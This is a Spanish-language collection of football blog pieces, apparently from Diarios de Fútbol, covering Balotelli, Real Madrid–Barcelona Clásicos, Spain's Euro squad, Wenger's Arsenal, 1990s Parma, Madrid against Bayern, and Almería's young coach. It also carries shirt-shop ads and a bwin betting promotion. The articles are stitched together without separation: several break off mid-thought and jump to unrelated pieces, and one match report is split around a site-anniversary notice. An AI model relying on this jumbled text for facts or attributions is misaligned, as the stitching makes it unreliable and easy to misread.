decidió por fin que era el momento de consumar su amor por el Milan. Lo consumó, pero también lo consumió. Demasiado rápido, en apenas unos meses. Rodeado de excesos, como todo en su excéntrica vida de Maseratis, fiestas exclusivas, fuegos artificiales domésticos y dinero despilfarrado. Liverpool fue la oportunidad para redimirse, para volver a encontrar el equilibrio tratando de ocultar la profunda huella de Luis Suárez.La trayectoria de Mario ha estado fuertemente vinculada a su origen y condición. Porque Mario, no se nos olvide, es un italiano negro. Un italiano que no nació siendo Balotelli, sino Barwuah, y que vivió la crueldad del rechazo en primera persona. Un inmigrante que no pudo adquirir la nacionalidad italiana hasta cumplida la mayoría de edad y que ha fundamentado su existencia en un desafío permanente y constante a quienes se obcecaron en señalar al negro, inmigrante y adoptado como alguien diferente. Un desafío trasladado al fútbol en una especie de justificación interminable, en un intento por demostrar que el negro la pegaba mejor que ninguno y que el racismo, tantas veces sufrido en esos campos italianos, no hacía sino agigantar su figura. Se equivocaba. Estaba dando importancia a aquellos que debía haber ignorado. Esa actitud desafiante ha resultado tan agotadora que ha consumido al futbolista con excesiva celeridad y le ha llevado, cuando aún no ha cumplido el cuarto de siglo, a convertirse en lo más cercano a una promesa incumplida. Dejando en muy mal lugar a aquel que un buen día se apresuró a llamarle ‘genio’. Puedes comprar camisetas de Mario Balotelli en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Un partido para siete puntos. El Clásico de esta noche pasa por ser el partido que el madridista estaba esperando como agua de mayo para terminar de confirmar la tendencia marcada desde que arrancase este año 2014.¿Qué hace que el aficionado siga creyendo en un club guiado por personas egoístas, frías, interesadas, avariciosas? ¿Qué hace que el aficionado siga yendo al estadio a ver a jugadores prestados, sin respeto por su propia condición de futbolista, que deambulan por el rectángulo sudando el alcohol de la noche anterior, exhibiendo su limitadísimo talento, desnudando su apatía ante miles de personas que tímidamente corean su nombre?La respuesta está en el futuro. En los goles que vendrán, en la hipotética alegría. En la explosión tras el gol local. El abrazo inesperado al compañero de grada. La vida del aficionado está anclada a lo que vendrá. Nuestro hogar será siempre el hogar futuro. La casa que algún día tendremos. Amar es un proyecto de mañana. Hacemos bien en no rendirnos porque ahora el tiempo sea tenebroso. Siempre habrá un día donde gritaremos de nuevo. Cada equipo tiene una celebración pendiente. En Primera, en Segunda, en Segunda B, en las cloacas del fútbol.Del fútbol. Este deporte siniestro donde veintidós futbolistas patean un balón de cuero con nuestro corazón en cada hexágono, con el futuro pendiente de que la pelota cruce la línea rival y se aleje, como sea, de la puerta que guarda nuestra casa. Tengo un compañero de piso rumano. Es guitarrista flamenco. Os juro que no os estoy contando un chiste. Es un chico ajeno al fútbol. Hoy le dije si sabía algo de Marica. Estamos en el salón esperando que se haga una pizza. Se ha reído bastante con lo de Marica. Me ha preguntado que si es cierto que hay un jugador llamado así. Lo primero que se aprende en un idioma nuevo son los insultos. Le he dicho que va a jugar en España y que se ha puesto en la camiseta Ciprian (se lee chíprian, me ha aclarado). Le he contado lo ridículo de la prensa haciendo bromas sobre el apellido como si tuviéramos nueve años y en el cole alguien hubiera dicho una palabrota. Ya que estábamos hablando le he preguntado por los jugadores más famosos en su país. Me dice que Hagi es dios allí. Le recuerdo el Mundial de USA 94. La victoria frente a Argentina. Stelea, Popescu, Hagi y Munteanu. Mi compañero de piso se apellida Munteanu, dice que le han preguntado en el aeropuerto dos veces si era hermano del futbolista.Me pregunta si su selección jugará el Mundial, que como va. No sé en qué piensa la gente a la que  no le gusta el fútbol. Lo busco y veo que no van mal. Segundos de grupo, tras Holanda. Me dice “sé que el otro día ganamos a Hungría. Le enseñamos a esos cabrones lo que es el fútbol”. Creo que los rumanos no se llevan bien con los húngaros. Al menos él. Aunque hubo altercados serios tras el partido. Omito que me gusta Hungría, no sólo el país sino su fútbol intermitente y profundo. Más que el rumano, claro. Aunque le recuerdo a Mutu. Me gustaba ese jugador. “Lo dejó todo por la droga el idiota” me dice. Tiene algo de razón. “Qué estará haciendo ahora, ¿sigue jugando?” .Se le vio gigantesco en la tanda de penaltis, con un imán para detener los lanzamientos argentinos uno tras otro, hasta que humildemente confesó su secreto, que habla muy bien de la profesionalidad del equipo de Löw: en unos papelitos tenía apuntado cómo lanzaba cada argentino, y fueron esas pequeñas instrucciones las que le dieron la pista clave. Quizá por eso ni se le vio celebrar el pase, por la seguridad en la victoria que le habían transmitido esos papeles; o quizá porque, sencillamente, era Lehmann. Resulta un tanto redundante o gratuito lanzarse a día de hoy con un previo de la Selección, cuando dos que cada tres artículos que se han escrito en este país en las últimas semanas cumplen más o menos esa función. Todo el mundo conoce hasta la talla de calzoncillos de los futbolistas, la marca de gomina que usan y si el rojo de sus botas es más granate o burdeos;  no hablemos de posición en el campo, si debieron convocarlos o no o si al final ganarán o nos hundirán en una miseria más  llevadera de lo habitual. Así, lo que haremos para no defraudar a los compañeros de DDF que asignaron las tareas eurocoperas será lanzar una mirada, un poco caprichosa y un mucho aleatoria, sobre algunas cuestiones que han venido rodeando al equipo nacional en los últimos tiempos. Y si queda algo decente, pues mejor.La suerte. Siempre que uno escribe de España, le tienta comenzar hablando del Prater y de Sudáfrica. Nos gustan los buenos recuerdos, las lágrimas de felicidad y el gol de Iniesta. Pensamos en qué bien jugamos, cómo dejamos atrás los lastres del pasado, reunimos un puñado de bajitos maravillosos y vencimos partido tras partido, sin piedad pero con clase, hasta forzar por dos veces a Casillas a levantar metal poseído por el éxito. No nos afectó la maldición de cuartos, estos jugadores sentían la camiseta aunque fueran de Barcelona o los Altos Hornos, y la Furia que tan perniciosa resultó para el equipo nacional había quedado atrás, como concepto y como justificación.Hay una parte de verdad en todo esto, pero también otra de optimismo desaforado. Cuando alguien preguntaba, en aquel triste 2006 de la gran sentada, por qué España se estrellaba campeonato tras campeonato, se invocaban todas las razones anteriores –y algunas más- para justificarlo, pero al menos una se despreciaba sistemáticamente: la suerte. No puede ser que tantas veces nos pase, no es normal, no es nada probable. Y la realidad es que no es tan improbable, y puede ocurrir. La muestra es muy pequeña. Reunidos todos los partidos que ha jugado España en todos los Mundiales desde el 82 –donde llega la memoria de muchos de nosotros- apenas hacen un campeonato de Liga. Y en las ligas pasan cosas muy extrañas. El tiempo y la importancia nos confunden.¿Dónde estaríamos si Cesc u otro no falla el penalty? ¿Y si el árbitro se equivoca y no anula el gol de Alemania, a falta de dos minutos, en Viena? ¿Y si cae el fuera de juego de Villa ante Portugal, marca Paraguay el penalty, echan a Ramos en semifinales o Robben no tira al muñeco? Ninguno de estos eventos es todo fortuna, pero sí que aparece en sobredosis en todos ellos. La suerte hay que buscarla, y España la tuvo en su mejor momento, cuando la respaldaba un equipo mayúsculo. Pero no la despreciemos, porque siempre es necesaria. Siempre.El gran ausente. Lleva como un año sumido en un triste proceso de arrinconamiento, en una situación muy diferente a la de 2010, después de su fenomenal Mundial y su fichaje por el Barça. Empujado contra la banda por la omnipresencia tiránica y necesaria de Messi, ya se hablaba de la suplencia de David Villa semanas antes de que un momento maldito le partiese la tibia en Yokohama. No ha llegado a la Eurocopa, y son muchas las voces que minusvaloran la importancia de su baja, a la vez que hablan de un posible declive inmediato. La realidad es que la selección cambió sus conceptos de juego y dejó atrás lastres milenarios, pero el tipo que una y otra vez echó la puerta abajo fue el Guaje. En acciones individuales o colectivas, contragolpes veloces o exquisiteces técnicas, llamó sucesivamente a la puerta de Rusia, Suecia, Honduras, Chile, Portugal y Paraguay para dejar a la Roja en territorios que hace sólo un lustro resultaban inalcanzables. La realidad es que a España le falta su mejor ariete, y resulta justo dedicarle unas pocas líneas al más ninguneado de los bicampeones. Claro que se le echará de menos. Cómo no.La línea continua. Posee Vicente del Bosque un status peculiar entre el público. Si bien nadie le niega la bonhomía, la calma, el porte quijotesco y una manera muy castellana de reinterpretar el fair play, sus capacidades como entrenador prosiguen dando lugar a innumerables debates. Sus defensores, entre los que se cuentan una mayoría de periodistas, ponen los títulos por delante para empezar a hablar: Ligas, Champions y Mundial, y luego ya empezamos a discutir de 3-4-3 y 5-3-2. Los que no lo pueden ni ver hablan de un preparador singularmente afortunado, que ha entrenado casi siempre a equipos potentes y cuya mayor virtud ha sido poner a los mejores y no hacer demasiado por ruido. Por supuesto, hay una tercera vía: aquellos que creemos que sí, que son buenos futbolistas, pero montar un equipo campeón no tiene nada que ver con las puntuaciones del FIFA; y también que quizá, cuando hay grandes jugadores, la perfección táctica no influye tanto como la motivación y la atención al detalle.A día de hoy, el Real Madrid está tal vez un par de peldaños por encima del FC Barcelona. Pero, ¿tanta la diferencia entre ambos como para que los azulgrana queden a siete puntos en la tabla en caso de victoria madridista hoy? Da la sensación de que mientras que el clima en Concha Espina se hacía más plácido, en Can Barça comenzaba a amenazar tempestad. Como si los vientos del Atlántico se hubiesen llevado la borrasca hacia el nordeste peninsular. Con Ancelotti en Madrid la normalidad volvió a reinar en el club blanco. De pronto, se despejó la permanente necesidad de atizar las brasas de cualquier mínimo incendio. Más bien al contrario, el sistema de control de incidencias del técnico madridista fue capaz de acabar con cualquier conato de polémica artificial mucho antes de que ésta pasase a convertirse en un problema real. Ocurrió con el debate de la portería, con el asunto Di María, con la dosificación de Jesé o con aquellos malos momentos de Benzema que llegaron a desesperar al graderío. Ninguna de estas ‘incidencias’ fue capaz de alterar el semblante, entre serio y burlón, como de quien tiene la situación perfectamente controlada ante el nerviosismo de los presentes, del técnico italiano. Observó, estudió, gestionó la solución a cada caso en privado y resolvió. Justo lo que se le debe de pedir a un técnico de este nivel, capacidad para sofocar los problemas cuando estos amenazan la estabilidad del equipo. Esa Pax Romana instaurada desde la toma de poderes de Ancelotti es el clima ideal para soñar con recuperar el trono liguero y, sobre todo, asaltar de manera definitiva la Décima. La necesaria dosis de mano izquierda que requería el día a día madridista contrasta con la borrasca que se cierne sobre Can Barça. Gerardo Martino pasa, en apenas unos días, de ser un genio de los banquillos (véase el partido del Etihad) a ser el mayor de los males que podían recaer sobre el barcelonismo. Si nos ceñimos a las sensaciones recientes, parece que el técnico argentino apura sus últimos meses al frente del banquillo azulgrana y que todo lo bueno que ocurra de aquí a final de temporada será ‘a pesar’ de su presencia, no gracias a su labor. ‘El partido del Bernabéu es la última oportunidad que tenemos‘, admitía el argentino días atrás, como quien es consciente de la realidad de su situación. Es de suponer que, pese a emplear la primera persona del plural, el Tata trataba de expresar un sentimiento en singular. Sabe que es su última oportunidad de demostrar que su trabajo no es el culpable de que la distancia con respecto al Real Madrid sea la que en la actualidad es, porque entiende que una hipotética distancia de siete puntos sería ya insalvable y que supondría un error muy difícil de justificar en el balance final de su temporada.Pero este Clásico tiene una lectura inesperada. Una tercera vía. Como las aves carroñeras que observan desde prudencial distancia y con infinita paciencia las batallas ajenas que les servirán de posterior festín, el Atlético de Madrid contempla, desde sus tres puntos de diferencia con respecto al líder, como Real Madrid y FC Barcelona le brindan su oportunidad de manera indirecta. Es de imaginar que el seguidor colchonero sueña con un empate y un buen número de daños colaterales desperdigados sobre el campo de batalla, con un escenario que permita a los de Simeone seguir en la pelea por el título. El Clásico, en cierto modo, también lo juegan ellos. La trayectoria pesa como un saco de arena sobre los hombros. Son ya seis temporadas consecutivas sin dar el nivel en Europa. Seis temporadas consecutivas, algunas de ellas con auténtica mala fortuna en el emparejamiento, cayendo en la ronda de octavos de final. Quedando fuera de los ocho mejores equipos del continente. Hablar mal de las teorías resultadistas y abonar el terreno del fútbol vistoso y desenfadado es sencillo cuando el protagonista no es ajeno y lejano. Pero a Arséne Wenger, al que a lo largo de estos últimos años se les han perdonado multitud de cosas, se le va agotando el filón de las excusas. Su innegociable apuesta queda en evidencia cada vez que toca medir fuerzas con un rival poderoso.Su propuesta, tras un arranque de siglo brillante y en el que apuntaba a ser un equipo definido por un marcado estilo centrado en el balón, arrastró una incómoda cojera durante varias temporadas. Fueron años complicados en lo económico en los que la obligada mudanza al nuevo estadio en el verano del 2006 lastró al club hasta dejarlo fuera del mercado. La plantilla no crecía, los pesos pesados acumulaban cada vez más kilómetros y el dinero, casi 400 millones de libras, seguía enterrado bajo las toneladas de hormigón y metal depositadas en Ashburton Grove. Las vacas flacas se consentían porque los motivos por los que el Arsenal no se encontraba en condiciones de competir económicamente contra los más acaudalados eran palpables. El precio por el lujo y la comodidad del nuevo estadio se daba por bien pagado mientras se tachaban las temporadas en el calendario a la espera de un repunte económico y de la necesaria disponibilidad de fondos que permitiera al club atacar el mercado internacional con expectativa optimista.Ocurre, sin embargo, que el impedimento de la inversión en el nuevo estadio y la indisponibilidad de fondos para invertir en mejorar la plantilla gunner ya no se sostiene. Desde la temporada 2011/12, el Arsenal ha invertido todos los años un mínimo de treinta millones de euros en reforzarse, destacando especialmente la fuerte inversión practicada en el verano de 2014 con más de cien millones de euros sacados de la caja (Calum Chambers, Welbeck, Gabriel Paulista, Debuchy, Alexis…). Ya no puede pasar por ese club intervenido por sus prestamistas y al que cualquier movimiento en el mercado le supone un esfuerzo extraordinario. Las excusas se agotan. Las explicaciones resultan ya improcedentes.Es el Arsenal un equipo hastiado. Un club en el que el liderazgo sobre el césped aparece extenuado después de años sin pisar posiciones de privilegio y en el que el complejo y profundo entramado de sillones y despachos nobles esconde recovecos insondables. Mucho esfuerzo para tan poco éxito. Mucha inversión para tan escaso rédito. Poco a poco, Ashburton Grove empieza a ser un lugar cada menos apetecible para echar raíces y buscar la gloria. Cada vez más, la imagen de Wenger de pie junto al banquillo se antoja como un holograma caduco y desfasado, como una imagen de alguien sujeto a una pesada condena más propia de otra época. Como si el fútbol se hubiese cansado de ser condescendiente con él y hubiese decidido pasar de largo ante su romántica propuesta, todo lo importante ocurre desde hace años lejos de su Arsenal.Me duele admitir, a mí, que he sido un vehemente y convencido defensor del alsaciano, que el tiempo de Wenger podría haber tocado a su fin. Porque todo acaba teniendo unos límites. Y todos acaban cansándose de no ganar. Cuando el fútbol italiano dominaba Europa con mano firme y chequera poderosa, nosotros aún acabábamos de salir de la adolescencia. Asistimos a las exhibiciones del Milan de Sacchi y los holandeses cuando todavía éramos unos niños y el fútbol nos interesaba de manera relativa, compartiendo espacio en nuestra organización cotidiana con los Lego o los Masters del Universo. Quizá por eso, por oír a nuestros mayores alabar las excelencias de aquel equipo que había despedazado sin remordimiento la enésima avanzadilla madridista en busca de la añorada Copa de Europa, el fútbol italiano era visto como una especie de ogro tenebroso y voraz. Recuerdo a mis primos mayores lamentarse y hablar con una mezcla de respeto, admiración y envidia de un equipo de fútbol que a mí, ajeno a toda aquella película, me parecía casi mitológico. Fue también la época en la que el FC Barcelona se hizo con los servicios de un tal Michael Laudrup, una estrella que languidecía en aquella Juventus huérfana de Boniek y Platini. Fueron además los extraños años en los que algunos conocidísimos jugadores españoles, como Martín Vázquez o Ricardo Gallego, se marcharon hacia el Calcio dejando atrás un futuro probablemente más estable en la liga española y condenando sus carreras en un fútbol en las antípodas del nuestro.A mí, que todas aquellas noticias me llegaban un poco en sordina y medio de refilón, Italia comenzaba a parecerme un país asombrosamente fascinante, precisamente en esa etapa de la vida en la que como algo te asombre y te impacte, lo termina haciendo para siempre. Tal vez por eso, cuando ya entrada en mi adolescencia el fútbol comenzó a ocupar una parte muy generosa de mi tiempo y mi atención, el primer lugar hacia el que dirigí la vista fue Italia, el país que acababa de acoger mi primer gran Mundial.Las páginas de la histórica Guerin Sportivo, que a Bilbao llegaba con cuentagotas, se terminaron por convertir en mi lectura de cabecera en aquellos años pre-Internet. Cada dos o tres semanas desfilaban ante mí los Maldini, Roberto Baggio, Signori, Bergomi, Vialli… las grandes estrellas de los grandes equipos eran los principales protagonistas de las páginas de la Guerin. Hasta que llegaron ellos. Con sus atípicas y vibrantes camisetas amarillas y azules, con sus onces repletos de futbolistas hasta entonces desconocidos, con esa firme apuesta por torpedear el orden establecido.Con el músculo financiero de la por entonces poderosa Parmalat y bajo la dirección técnica de Nevio Scala, el Parma AC irrumpió en la Serie A con la fuerza de un tornado. Apenas unos meses después del primer ascenso de su historia a la máxima categoría del fútbol transalpino, el Parma coronaba un año de éxitos con la sexta posición final en la clasificación liguera. Era la puerta del continente. La llave para el que sería el escenario más exitoso del club de la Emilia-Romagna. Porque si por algo se recuerda al Parma de la década de los noventa es por una cadena de éxitos europeos sin precedentes en la historia del fútbol continental. La Coppa de Italia del año 92 fue supuso el primer título de su historia. Luigi Apolloni, Antonio Benarrivo y Lorenzo Minotti, que acabarían siendo internacionales, ya destacaban en la defensa de aquel equipo. El sueco Thomas Brolin y Alessandro Melli aportaban el gol. Sobre aquella sólida base, Parmalat comenzó a inyectar liras sin reparar en gastos. Llegó el Tino Asprilla y, con él, el primer título europeo: la Recopa de 1993. Aquel éxito sin precedentes en un club que tres años atrás peleaba los cero a cero en el campo del Catanzaro o de la Triestina, disparó la euforia y terminó por desatar una tendencia que a la larga terminaría siendo devastadora. Parmalat decidió hacer del Parma la nueva referencia del fútbol italiano. Gianfranco Zola, Néstor Sensini, Dino Baggio y Fernando Couto apuntalaron la plantilla del campeón de la Copa de la UEFA de 1995. La ambición parecía no tener límite. Y la década no iba a terminar sin ver de nuevo al Parma levantar un título continental.Con una plantilla profundamente renovada en la que sobresalían los nombres de Gigi Buffon, Fabio Cannavaro, Hernán Crespo, Lilian Thuram, Enrico Chiesa o Juan Sebastián Verón, el Parma repitió éxito al levantar la Copa de la UEFA de 1999. Sería, esta vez sí, su último título europeo. La resaca del éxito aún alcanzó para ganar otra Coppa en el año 2002. Pero el equilibrio logrado durante la década de los noventa comenzó a dar síntomas de podredumbre. Las desproporcionadas inversiones multimillonarias de Parmalat acabarían destapando un escándalo financiero que terminó llevando a la bancarrota al gigante de la industria de la alimentación. Con Parmalat, se hundió el Parma. Era el año 2004, y el glorioso Parma Associazione Calcio se veía obligado a renombrarse como Parma Football Club, desprendiéndose de sus mejores futbolistas para hacer frente a las cuantiosas deudas acumuladas, al mismo tiempo que abandonaba las camisetas amarillas y azules para recuperar el tradicional uniforme blanco con la cruz negra.El fútbol en el Ennio Tardini no volvió a ser igual. El club llegó incluso a perder su sitio en la Serie A en la temporada 2007-08, tras dieciocho años consecutivos entre los grandes del país, aunque no tardó en recuperarlo apenas una temporada más tarde. A día de hoy, Parma ha recuperado el pulso, se ha estabilizado en la máxima categoría y aspira a volver a competir en Europa más pronto que tarde. Más de veinte años después de que llegaran ellos. Los que se empeñaron en cambiar el orden establecido en el fútbol italiano.Puedes comprar camisetas del Parma AC, del Parma FC y de cientos de equipos más en Classic Football Shirts, la tienda online especializada en camisetas de fútbol de todo el mundo. Pocas veces un partido de fútbol escenificó la oposición de dos estilos futbolísticos tan antagónicos como el juego posicional y el juego a la contra. Real Madrid y Bayern Múnich dirimieron sobre el césped del Santiago Bernabéu, en la ida de la semifinal de la Liga de Campeones, la superioridad de su estilo particular. Ambos válidos, ambos vistosos, ambos productivos y ambos emocionantes. Dos maneras de entender el juego que anoche casaron a la perfección. Unos amasando lenta y concienzudamente y otros disparando la flecha en cuanto el rival dejó un mínimo resquicio. La puesta en escena vivió su máxima y más evidente expresión en los veinte primeros minutos del choque. Arrinconado en torno al área de Casillas, el Madrid aguardaba su turno mientras el Bayern tejía una red de líneas de pase interminable en campo contrario, en un arranque de partido muy complicado para la estima madridista y el sistema nervioso de sus aficionados. Con una autoridad aplastante, el Bayern estaba sublimando el fútbol posicional de Pep y llevándolo hasta los límites del paroxismo de manera imponente… pero no incontestable. Aunque aparentemente asustado y empequeñecido ante la exhibición de fútbol asociativo bávara, el Madrid maduraba en silencio la punta de lanza de su idea de juego.LLovían ya los cánticos agoreros cuando en apenas dos parpadeos se gestó la fugaz jugada que dio origen al gol blanco. Paciencia en el inicio, velocidad en el despliegue y precisión exquisita en la ejecución del último pase. Cuatro futbolistas, cuatro pases y los cuatro con pleno sentido y significado propio. Isco, Cristiano, Coentrão y Benzema para definir la apuesta por el contraataque. Al menos anoche, no fue necesario nada más que el certero sablazo del francés y una buena disposición competitiva a lo largo de los noventa minutos de partido para resistir el temido asedio germano. ¿Significa esto que la apuesta por la contra es más válida que la que aboga por el fútbol posicional y de toque? ¿Establece el uno a cero del Bernabéu una supremacía indiscutible de un estilo sobre el otro? Y, sobre todo, ¿implica el resultado de ayer la anulación y pérdida de vigencia de la idea futbolística derrotada?Queda la sensación, en estos tiempos de permanente confrontación de ideas futbolísticas bien diferenciadas, que las verdades lo son en un sentido absoluto, casi axiomático. Que nada admite puntualización o matización y que si uno opta por el negro jamás podrá (ni deberá) admitir que también el blanco tiene sus virtudes. En la era futbolística del conmigo o contra mí, parece que si eres de uno no puedes reconocer las bondades del otro, ni mucho menos tratar de interpretarlas a tu manera.Esa estirpe de sufridores legendarios que conforma la hinchada blanquinegra oficia un funeral figurado  por la muerte del viejo estadio. St James’ Park pasaba a ser el Sports Direct Arena, las tiendas con las que Mike Ashley, a la sazón dueño del Newcastle, se forra vendiendo camisetas y chándals por toda Inglaterra.Embed from Getty ImagesEl futbolista Piermario Morosini fallece de un ataque al corazón, a los 25 años, durante un Pescara-Livorno de la Serie B 2012. El Armando Picchi recibe el cuerpo de su futbolista y le despide como un verdadero héroe tres días después. Desde entonces ninguna camiseta granata lleva el número 25. Italia 2000. La Lazio remonta nueve puntos de desventaja en las últimas jornadas y llega a la última fecha con opciones de robarle la liga a la Juventus. Los de Eriksson juegan en casa contra un equipo salvado, la Reggina, pero la Juve debe hacer lo propio en Perugia contra otro club sin aspiraciones en la tabla. Un equipo al que ya habían derrotado el año pasado. Pan comido. La Lazio gana lo suyo pero llegan malas noticias desde el Renato Curi: el partido de la Juve se suspende durante 80 minutos porque el agua anega el césped. Entre sospechas laziales se reanuda el encuentro, el Perugia marca en la segunda parte y el título se va a Roma.Para añadir voltaje a aquel final histórico, las acusaciones contra los turineses por supuestos favores arbitrales fueron constantes durante todo el campeonato. Los ultras romanos llegaron a boicotear el Giro de Italia como protesta por un gol anulado a Cannavaro y organizaron un funeral por la muerte del fútbol italiano en la jornada que decidía el campeonato. A mediodía partieron de Plaza Flaminio de luto, por la tarde eran campeones. The winner takes it all, the loser standing small cantaban los horteras de Abba entre lucecitas, raso morado y arreglos acaramelados echándole drama de cartón piedra al asunto. El ganador se lo lleva todo, el perdedor se encoge. No sé por qué se me ocurren estas escenas, dialéctica para párvulos, cuando pienso en la traca de clásicos que mañana prenderá por vez primera en el Bernabéu. Y reconozco que al conocer el programa no sentí otra cosa que pereza. ¿Con tantos colorines dónde quedará el fútbol? Claro que luego recapacitas y piensas que detrás de los fuegos artificiales, los voceros mercenarios preparados para la arenga, que esas filas me queden bien prietas, las polémicas de baratillo y el humo embotellado hay cuatro señores partidos. Que en la calle principal, cara a cara sobre el polvo, estarán los dos protagonistas en un tour de force casi inédito y que, qué carajo, esa preciosa anomalía no se disfruta en España desde hace 95 años y merece la pena atravesar el laberinto de insensateces para disfrutar, al fin, del fútbol. Con mayúsculas.Si a Don King le hubiese dado por meter sus pezuñas ensortijadas en esto de la pelotita hubiera soñado calendarios como el que arrancará en el Santiago Bernabéu. Los dos mejores matones frente a frente durante dieciocho días, rivalidad máxima y al menos dos cinturones, los optimistas apuntan al trío, en juego. Con su campeón legendario y el aspirante resabiado que llega para comerse el mundo, con cuentas pendientes e historia en cada puñetazo. Con dos zorros de métodos dispares dibujando el camino al éxito desde los rincones. Sí, es de película. Ambos vienen de transformar rivales en muñecos y aunque la mayoría le concedemos cierta ventaja al del calzón blaugrana, ahí está su historial, la escena final aun sigue a la espera de ser escrita.Dicen los que saben que el Barcelona parte con la ventaja de conocerse a si mismo. Reconoce hasta la última fibra del traje con el que ha conquistado sus mayores éxitos y le sienta como un guante. Hay que reconocer que, hoy por hoy, el funcionamiento que ha impuesto Guardiola es inalcanzable para el resto de equipos. El Real Madrid es, reconocido incluso por Mourinho, un sistema aun en construcción. Un sistema potentísimo, añado, pero al que aun le falta probarse en situaciones de máxima exigencia. Esto es, contra el máximo rival en cuádruple sesión. El primer envite en el Bernabéu será el menos trascendente, tal y como ha quedado la tabla doméstica en las últimas fechas, pero le da a los blancos la oportunidad de explorar el terreno. De descifrar al rival y aprovechar el conocimiento para los partidos con premio inmediato.Busquets, y a un mediocentro hay que hacerle caso en cuestiones tácticas, intuye un Madrid con ánimo de carterista. Uno que les dispute la propiedad del balón. Es de cajón y no queda otra que coincidir mientras a esto se juegue con una redonda pero a mi se me antoja primordial para el triunfo blanco el que sepan neutralizar la presión azulgrana. Sobre todas las cosas. El peligro del Barcelona, más que del fútbol control, llega cuando roban con el equipo adelantado. El Madrid debe eliminar riesgos en la construcción, Mourinho lo interpretó a la perfección el año pasado con el Inter, y aprovechar su innegable potencia y velocidad a la contra. Parecerá una traición a la grada pero puede ser la manera. Esto y que Özil, sin duda el que mejor ve el futbol de la plantilla madridista, provea. Me salto el análisis blaugrana, también ausencias defensivas, porque no les voy a contar nada que no sepan y porque lo que me interesará al final del encuentro, unicamente, es comprobar si realmente el campeón tiene rival para el resto del maratón. Porque ahora mismo tengo dudas.Recuerda Sid Lowe, tirando del pensamiento de Johan Cruyff, que el Madrid no necesita ganar los cuatro partidos, que con ganar el segundo y el cuarto le sirve. Que esto son cuatro batallas pero una única guerra. Coincido. El Madrid lo sabe y el Barcelona lo sabe pero no olvidemos que lo del Bernabéu, la primera entrega de este Clásico por fascículos, puede marcar la tónica del resto de la función. Por cierto, ¡qué comience ya el espectáculo!Cada semana, y de la mano de bwin.com, os ofreceremos los partidos más interesantes del fútbol mundial, con especial atención a todos aquellos que os manejáis en el mundo de las apuestas on-line. La potencia de los dos rivales y la expectativa dejan el resultado del partido en el alero. Tanto que la victoria local se paga casi tanto como la visitante. 2.80 al Madrid y 2.30 al Barça en bwin.com. Claro que para los que busquen el morbo la consabida manita, el 5-0 o el 0-5 se pagan a unos sabrosísimos 18.50 €. ¿Imaginan ganar al rival y además llevarse los euros con semejante carambola? En Diarios de Fútbol estamos de cumpleaños. Aunque comenzamos a escribir un 16 de agosto, fue el primero de septiembre de 2006 el día escogido para presentaros nuestro por entonces incipiente proyecto. Cuatro años después y con el ánimo intacto para hacer de DDF un producto cada vez mejor, hemos decidido darle un lavado de cara a la página coincidiendo con el aniversario de la criatura. En el nuevo diseño hemos querido mantener un aspecto similar, conservando la mayor parte de las funcionalidades actuales pero incorporado alguna novedad necesaria  y eliminado elementos que habían quedado en desuso. Lo podréis ver en unos días y esperemos que sea de vuestro agrado.Dado que todo cambio conlleva inversión queremos aprovechar para agradeceros la maravillosa acogida que nos habéis dispensado desde el comienzo. Sin esa fidelidad, traducida en visitas y apoyo para conseguir unos ingresos mínimos, no hubiera sido posible mejorar.Profundo error, el de los totalitarismos ideológicos y estilísticos. Por suerte, hay quien sigue creyendo en la capacidad de transformación y en la variedad de interpretación de las ideas. Ayer el Real Madrid salió airoso, y con un resultado considerablemente favorable de cara al partido de Alemania, porque supo interpretar a su modo y manera lo mejor de dos estilos aparentemente antagónicos y enfrentados. Supo ser uno, cuando le convenía, y otro cuando entendió que era la mejor salida posible a su delicada situación sobre el césped. Porque el camaleónico Madrid del segundo tiempo no solo le discutió el balón a su rival, sino que en varias fases del choque se lo birló con maestría. Crecieron Alonso, Modric e Isco en torno a la posesión de la pelota, al mismo tiempo que desnudaron las carencias de un Bayern que es fortísimo por las alas pero vulnerable por la zona central. Detectado el problema surgido con el cambio de registro madridista por parte de Guardiola, solo la inclusión de Javi Martínez en la medular teutona pudo contener la reversión del juego.Abrazado a dos estilos en apariencia inmiscibles, el Madrid supo sacar partido de lo mejor de cada uno de ellos en el momento preciso. Gestionó su ocasión de gol aferrado a la posibilidad del contragolpe y se defendió de las acometidas bávaras tratando de esconder el balón a su rival a fuerza de retenerlo y hacerlo circular por el verde. Para tratar de dejar claro que en el fútbol ninguna verdad es absoluta. ‘Tengo 35 años y no tengo experiencia en equipos de primer nivel. Puedo entender que la gente tenga dudas, pero me siento plenamente capacitado para dirigir al Almería en Primera. De lo contrario, no estaría aquí sentado‘. Lo primero que llamaba la atención de Francisco Javier Rodríguez Vílchez, el hombre encargado de guiar al Almería hacia la permanencia en su retorno a la elite, era su edad. Demasiado joven para lo acostumbrado en un banquillo de Primera, demasiado inexperto para ser el sustituto de Javi Gracia, el héroe del ascenso. Pese a ser un hombre de la casa, almeriense, y ser un buen conocedor del club por venir de dirigir al filial, Francisco no se encontró de entrada con un trato de precisamente de favor. Despertaba demasiadas dudas. Fue como si, de repente, el Estadio de los Juegos del Mediterráneo olvidara que su equipo no gozaba de una plantilla para muchos lujos. Como si hubiese decidido pasar por alto que las incorporaciones veraniegas, los refuerzos que debían de convertir un equipo diseñado para competir en Segunda en uno dispuesto a pelear su plaza en Primera, ceñidos al escaso presupuesto disponible (el más bajo de Primera), no iban a permitir demasiadas alegrías. Dubarbier, Torsiglieri, Suso, Rodri, Óscar Díaz o Marcos Tébar, todos ellos caras nuevas en la plantilla almeriense, acabaron teniendo, cada uno a su modo, gran protagonismo en la campaña de los andaluces. La UD Almería era, ha sido, un equipo justito para mantenerse. Por eso, la labor del técnico más joven de Primera división ha de ser convenientemente valorada.Sigo pensando que el Almería, o su presidente Alfonso García, acertó con la contratación de Francisco. Sin entrar a valorar los motivos reales de la confianza depositada en un hombre de perfil bajo como el extécnico del filial almeriense (hay quien afirma que la relación entre Gracia y Alfonso García no era todo lo buena que debería y que el navarro no quedó satisfecho cuando se puso sobre su mesa el proyecto del año del retorno a Primera), lo cierto es que el objetivo con el que arrancaba la temporada se ha terminado cumpliendo. Francisco ha terminado la campaña como la comenzó: siendo terriblemente discutido y con un montón de dudas revoloteando sobre su capacidad. Sin embargo, hoy mismo se anunciaba de manera oficial que su contrato era renovado por una temporada más. Francisco seguirá siendo el técnico de la UD Almería en la temporada 14/15. Si el año pasado ya se sentía ‘capacitado para dirigir al Almería en Primera‘, nada hace pensar que no siga estándolo después de haber logrado su objetivo. Si la edad supone problema, justo es pensar que es algo que el tiempo termina 